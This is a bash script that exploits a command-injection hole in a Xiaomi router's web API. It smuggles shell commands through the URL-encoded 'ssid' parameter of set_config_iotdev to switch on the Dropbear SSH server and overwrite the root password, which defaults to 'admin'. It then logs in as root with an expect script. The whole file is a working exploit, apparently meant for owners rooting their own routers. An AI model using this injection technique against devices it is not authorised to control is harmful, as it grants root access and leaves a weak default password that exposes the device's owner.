#!/bin/bash

param_index=1

if [[ $1 =~ "shell.sh" ]]
then
  param_index=0
fi

stok=${!param_index}
next_index=$((param_index + 1))
passwd=${!next_index}

if [ -z $stok ]; then
  echo "Usage: ./shell.sh <stok> [password]"
  exit 1
fi

if [ -z $passwd ]; then
  echo "set root password default to admin"
fi


passwd=${passwd:=admin} # default password is admin

enable_ssh="http://192.168.31.1/cgi-bin/luci/;stok=$stok/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B"
change_passwd="http://192.168.31.1/cgi-bin/luci/;stok=$stok/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20echo%20-e%20'$passwd%5Cn$passwd'%20%7C%20passwd%20root%3B"

# enable ssh
result=`curl -s $enable_ssh`

if [[ $result =~ "{\"code\":0}" ]]
then
  echo enable ssh ok!
else
  echo enable ssh failed! 
  echo $result
  exit 1
fi

# change root passwd to admin
result=`curl -s $change_passwd`

if [[ $result =~ "{\"code\":0}" ]]
then
  echo change password ok!
else
  echo change password failed! 
  echo $result
  exit 1
fi

mkdir -p /tmp/mi-wifi
cat << 'EOF' > /tmp/mi-wifi/ssh.exp
#!/usr/bin/expect
set passwd [ lindex $argv 0 ]

set timeout 10 
spawn ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.31.1
expect {
  "yes/no" { send "yes\n"; exp_continue }
  "password:" { send "$passwd\n" }
}
interact
EOF

chmod +x /tmp/mi-wifi/ssh.exp

expect /tmp/mi-wifi/ssh.exp $passwd

rm /tmp/mi-wifi/ssh.exp